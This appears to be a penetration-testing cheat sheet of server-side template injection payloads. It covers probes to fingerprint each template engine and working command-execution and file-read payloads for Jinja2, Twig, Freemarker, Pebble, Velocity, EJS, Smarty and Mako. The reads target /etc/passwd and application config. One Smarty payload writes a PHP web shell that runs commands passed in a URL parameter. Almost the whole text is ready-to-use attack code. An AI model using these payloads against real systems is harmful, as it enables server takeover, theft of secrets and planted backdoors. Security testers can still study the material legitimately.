# SSTI Payloads — Per-Engine Detection + Exploitation

## Universal Detection (determines engine)
```
{{7*7}}          → 49 = Jinja2/Twig/Nunjucks
${7*7}           → 49 = Freemarker/Mako/Thymeleaf
#{7*7}           → 49 = Pebble/Thymeleaf
<%= 7*7 %>       → 49 = ERB/EJS
{7*7}            → 49 = Smarty
{{7*'7'}}        → 7777777 = Jinja2 (string multiplication)
{{7*'7'}}        → 49 = Twig (numeric)
```

## Jinja2 (Python — Flask/Django)
```python
# RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}
{{request.__class__.__mro__[4].__subclasses__()[455].__init__.__globals__['popen']('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Read files
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()}}
```

## Twig (PHP — Symfony/Laravel)
```php
# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{app.request.server.all|join(',')}}

# File read
{{'/etc/passwd'|file_excerpt(1,30)}}
```

## Freemarker (Java — Spring)
```java
# RCE
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}

# Read files
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

## Pebble (Java)
```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec('id') }}
```

## Velocity (Java)
```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')
```

## EJS (JavaScript — Express)
```javascript
<%= process.mainModule.require('child_process').execSync('id').toString() %>
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

## Smarty (PHP)
```php
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Mako (Python)
```python
${__import__("os").popen("id").read()}
<%import os; x=os.popen('id').read()%>${x}
```
